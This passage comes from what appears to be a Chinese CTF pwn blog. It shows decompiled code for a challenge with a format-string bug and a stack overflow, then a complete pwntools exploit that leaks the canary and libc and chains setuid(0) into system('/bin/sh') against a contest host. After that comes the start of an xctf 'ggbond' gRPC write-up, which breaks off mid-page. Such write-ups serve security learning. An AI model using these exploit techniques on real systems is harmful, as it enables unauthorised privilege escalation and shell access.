punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> v8 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_1633</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> v1 <span class="token operator">*</span> v5 <span class="token operator">+</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  dword_504C <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v6<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Calculation Done."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v8 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>功能<code>2</code>存在格式化字符串漏洞，由于<code>main</code>函数里是<code>while</code>循环，所以这个格式化字符串漏洞是可以多次被使用的，这个函数里调用了一个存在栈溢出漏洞的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_19EA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your nickname."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">", your rating is: %d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_504C<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_504C <span class="token operator">&lt;</span> dword_5010 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I think you should play more maimai."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_1984</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_1984</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Big God Coming!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Can you teach me how to play maimai?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于保护全开，所以要泄露<code>canary</code>和<code>libc</code>，直接<code>getshell</code>打远程会发现没有读<code>flag</code>的权限，这里有两种思路：</p><ul><li><code>openat</code>代替<code>open</code>读<code>flag</code></li><li><code>setuid(0)</code>提权</li></ul><p>我复现的时候用的第二种，第一种比较麻烦，需要再泄露栈地址并且在栈上构造<code>orw</code>，还存在读长度不够的问题，需要再调用一次<code>read</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node.nkctf.yuzhian.com.cn'</span><span class="token punctuation">,</span> <span class="token number">38179</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Select a option'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Input chart level and rank'</span><span class="token punctuation">,</span> <span class="token string">b'1 S '</span> <span class="token operator">*</span> <span class="token number">49</span> <span class="token operator">+</span> <span class="token string">b'10000 S'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Select a option'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'nickname.'</span><span class="token punctuation">,</span> <span class="token string">b'%7$p%3$p'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc6_2.35-0ubuntu3.6_amd64/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1147e2</span>rdi <span class="token operator">=</span> <span class="token number">0x000000000002a3e5</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x0000000000029139</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>setuid <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setuid'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setuid<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Can you teach me how to play maimai?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> 沙箱 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-ggbond复现</title>
      <link href="/2024/03/23/xctf-ggbond-fu-xian/xctf-ggbond-fu-xian/"/>
      <url>/2024/03/23/xctf-ggbond-fu-xian/xctf-ggbond-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>题目是一点看不懂，网上找<code>wp</code>拼拼凑凑复现一下</p><p>题目给了一个<code>docker</code>和一个<code>pow.py</code>，加注释版<code>pow.py</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 导入所需的库</span><span class="token keyword">import</span> string<span class="token keyword">import</span> itertools<span class="token keyword">import</span> re<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 用于网络连接和交互</span><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256  <span class="token comment"># 用于计算SHA-256哈希值</span><span class="token comment"># 目标服务器的IP地址和端口号（这里需要替换成实际的值）</span>remote_ip <span class="token operator">=</span> <span class="token string">''</span>remote_port <span class="token operator">=</span> <span class="token number">1337</span><span class="token comment"># 解决PoW挑战的函数</span><span class="token keyword">def</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 建立到远程服务器的连接</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>remote_ip<span class="token punctuation">,</span> remote_port<span class="token punctuation">)</span>    <span class="token comment"># 接收挑战字符串，直到遇到 ' == '，并解码成字符串格式</span>    rev <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' == '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 使用正则表达式从接收到的挑战中提取所需的字符串部分</span>    pattern <span class="token operator">=</span> <span class="token string">r'xxxx\+([a-zA-Z0-9]+)'</span>    rev <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> rev<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># 接收目标摘要值</span>    target_digest <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 定义字符集合，用于生成所有可能的4字符组合</span>    characters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits    <span class="token comment"># 生成所有可能的4字符组合</span>    all_combinations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>comb<span class="token punctuation">)</span> <span class="token keyword">for</span> comb <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>characters<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment"># 遍历所有组合，寻找满足条件的字符串</span>    <span class="token keyword">for</span> comb <span class="token keyword">in</span> all_combinations<span class="token punctuation">:</span>        proof <span class="token operator">=</span> comb <span class="token operator">+</span> rev  <span class="token comment"># 拼接字符串</span>        digest <span class="token operator">=</span> sha256<span class="token punctuation">(</span>proof<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 计算SHA-256哈希值</span>        <span class="token keyword">if</span> target_digest <span class="token operator">==</span> digest<span class="token punctuation">:</span>  <span class="token comment"># 检查哈希值是否与目标摘要匹配</span>            result <span class="token operator">=</span> comb  <span class="token comment"># 如果匹配，保存结果</span>            <span class="token keyword">break</span>    <span class="token comment"># 将找到的解决方案发送给服务器</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>         <span class="token comment"># 接收下一步的连接指令</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' nc '</span><span class="token punctuation">)</span>    rev <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 使用正则表达式提取目标IP地址和端口号</span>    pattern <span class="token operator">=</span> <span class="token string">r'(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\s(\d+)'</span>    result <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> rev<span class="token punctuation">)</span>    target_ip <span class="token operator">=</span> result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    target_port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 等待3秒</span>    <span class="token keyword">return</span> target_ip<span class="token punctuation">,</span> target_port  <span class="token comment"># 返回目标IP地址和端口号</span>        <span class="token comment"># 调用函数并保存结果</span>target_ip<span class="token punctuation">,</span> target_port <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>Proof of Work (PoW)</code> 是一种共识机制，它通过要求请求者完成一项计算工作来证明其请求的合法性。这段代码的主要作用是通过解决<code>Proof of Work (PoW)</code>来获取远程服务器指定的下一目标<code>IP</code>地址和端口号</p></blockquote><p>运行<code>pwn</code>看看，监听了<code>23334</code>端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$./pwn<span class="token number">2024</span>/03/21 <span class="token number">14</span>:36:52 server listening at <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:23334<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>docker/bin</code>中有一个<code>pwn</code>文件，检查保护</p><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放到<code>IDA</code>里分析，是一个<code>go</code>程序（好好好，也是第一次写</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">469</span>D80<span class="token operator">:</span> using guessed type <span class="token keyword">void</span> __golang __noreturn <span class="token function">start</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>.gopclntab</code>段存在以下内容</p><pre class="line-numbers language-none"><code class="language-none">aGoogleGolangOr_353 db &#39;google.golang.org&#x2F;grpc&#x2F;internal&#x2F;transport.(*http2Server).WriteHeaderaGoogleGolangOr_55 db &#39;google.golang.org&#x2F;protobuf&#x2F;internal&#x2F;encoding&#x2F;json.init&#39;,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><code>RPC (Remote Procedure Call)</code>远程过程调用，允许一台计算机通过网络调用另一台计算机上的程序或函数，<code>RPC</code>框架通常负责打包（序列化）请求参数，传输消息，在服务器端解包（反序列化）参数，执行远程过程，并将结果返回给客户端</p></blockquote><blockquote><p><code>gRPC</code>是由<code>Google</code>开发的现代开源高性能<code>RPC</code>框架，支持多种编程语言。<code>gRPC</code>默认使用<code>Protocol Buffers（protobuf）</code>作为接口定义语言（<code>IDL</code>）和其底层消息交换格式，提供了一种简洁高效的方式来定义服务和生成客户端和服务器代码</p></blockquote><blockquote><p><code>Protobuf（Protocol Buffers）</code>是<code>Google</code>开发的一种语言中立、平台中立、可扩展的序列化结构数据的方法，广泛用于通信协议和数据存储等多种场合</p></blockquote><p>可以使用<code>pbtk（Protobuf Toolkit）</code>工具反编译和重新编译<code>Google Protobuf</code>：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><blockquote><p><code>pbtk（Protobuf Toolkit）</code>是一套成熟的脚本，可通过统一的 <code>GUI</code> 访问，它提供两个主要功能：</p><ul><li><strong>从程序中提取<code>Protobuf</code>结构</strong>，将其转换回可替代的<code>.proto</code></li><li><strong>通过方便的图形界面编辑、重播和模糊</strong>发送到 <code>Protobuf </code>网络端点的数据</li></ul></blockquote><p>工具安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip <span class="token function">git</span> openjdk-9-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5$ <span class="token function">sudo</span> pip3 <span class="token function">install</span> protobuf pyqt5 pyqtwebengine requests websocket-client$ <span class="token function">git</span> clone https://github.com/marin-m/pbtk$ <span class="token builtin class-name">cd</span> pbtk$ ./gui.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择<code>step1</code>选<code>pwn</code>文件，在<code>.pbtk</code>文件夹中得到<code>ggbond.proto</code>，以下是加注释版</p><blockquote><p><code>.proto</code> 文件是使用 <code>Protocol Buffers (protobuf) </code>定义数据结构的文本文件</p></blockquote><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token comment">// 指定使用protobuf的第三版语法</span><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span><span class="token comment">// 定义了一个包名GGBond，这有助于防止命名冲突，并可能被用于生成的代码包路径等</span><span class="token keyword">package</span> GGBond<span class="token punctuation">;</span><span class="token comment">// 指定生成的Go代码的包路径和包名，这里指示protoc生成的Go代码位于"./"目录下，包名为ggbond</span><span class="token keyword">option</span> go_package <span class="token operator">=</span> <span class="token string">"./;ggbond"</span><span class="token punctuation">;</span><span class="token comment">// 定义一个服务GGBondServer，它包含了一个RPC方法Handler</span><span class="token keyword">service</span> <span class="token class-name">GGBondServer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Handler方法接受一个Request类型的请求，并返回一个Response类型的响应</span>    <span class="token keyword">rpc</span> <span class="token function">Handler</span><span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token class-name">Response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义一个Request消息，包含一个名为request的oneof字段，表示请求可以是以下类型之一</span><span class="token keyword">message</span> <span class="token class-name">Request</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// oneof关键字表示request字段只能设置其一</span>    <span class="token keyword">oneof</span> request <span class="token punctuation">&#123;</span>        <span class="token positional-class-name class-name">WhoamiRequest</span> whoami <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>          <span class="token comment">// Whoami请求</span>        <span class="token positional-class-name class-name">RoleChangeRequest</span> role_change <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span> <span class="token comment">// 角色变更请求</span>        <span class="token positional-class-name class-name">RepeaterRequest</span> repeater <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>      <span class="token comment">// 重复器请求</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义一个Response消息，包含一个名为response的oneof字段，表示响应可以是以下类型之一</span><span class="token keyword">message</span> <span class="token class-name">Response</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">oneof</span> response <span class="token punctuation">&#123;</span>        <span class="token positional-class-name class-name">WhoamiResponse</span> whoami <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>          <span class="token comment">// Whoami响应</span>        <span class="token positional-class-name class-name">RoleChangeResponse</span> role_change <span class="token operator">=</span> <span class="token number">201</span><span class="token punctuation">;</span> <span class="token comment">// 角色变更响应</span>        <span class="token positional-class-name class-name">RepeaterResponse</span> repeater <span class="token operator">=</span> <span class="token number">202</span><span class="token punctuation">;</span>      <span class="token comment">// 重复器响应</span>        <span class="token positional-class-name class-name">ErrorResponse</span> error <span class="token operator">=</span> <span class="token number">444</span><span class="token punctuation">;</span>            <span class="token comment">// 错误响应</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义WhoamiRequest消息类型，用于Whoami请求，不包含任何字段</span><span class="token keyword">message</span> <span class="token class-name">WhoamiRequest</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义WhoamiResponse消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">WhoamiResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">;</span> <span class="token comment">// 响应消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RoleChangeRequest消息类型，包含一个role字段，类型为uint32</span><span class="token keyword">message</span> <span class="token class-name">RoleChangeRequest</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint32</span> role <span class="token operator">=</span> <span class="token number">1001</span><span class="token punctuation">;</span> <span class="token comment">// 请求中指定的角色</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RoleChangeResponse消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">RoleChangeResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2001</span><span class="token punctuation">;</span> <span class="token comment">// 响应消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RepeaterRequest消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">RepeaterRequest</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">1002</span><span class="token punctuation">;</span> <span class="token comment">// 请求中包含的消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RepeaterResponse消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">RepeaterResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2002</span><span class="token punctuation">;</span> <span class="token comment">// 响应消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义ErrorResponse消息类型，用于错误响应，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">ErrorResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span> <span class="token comment">// 错误消息</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新编译<code>Google Protobuf</code>,这里需要先安装<code>grpc_tools</code>（编译<code>.proto</code>文件的<code>gRPC</code>插件,<code>Protocol Buffers（Protobuf）</code>编译器的<code>Python</code>版本），这样就得到了<code>ggbond_pb2_grpc.py</code> 、<code>ggbond_pb2.py</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> grpcio-toolspython3 <span class="token parameter variable">-m</span> grpc_tools.protoc -I. <span class="token parameter variable">--python_out</span><span class="token operator">=</span>. <span class="token parameter variable">--grpc_python_out</span><span class="token operator">=</span>. ggbond.proto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>ggbond_pb2_grpc.py</code>：包含了<code>grpc</code>服务的<code>Python</code>代码，定义了服务和客户端类，这样就可以使用<code>python</code>应用程序实现和调用定义在<code>.proto</code>文件中的<code>grpc</code>服务，用于构建和部署<code>grpc</code>服务，可以在服务端实现这些类中定义的接口，并在客户端创建对应的存根来远程调用这些接口</p><pre class="line-numbers 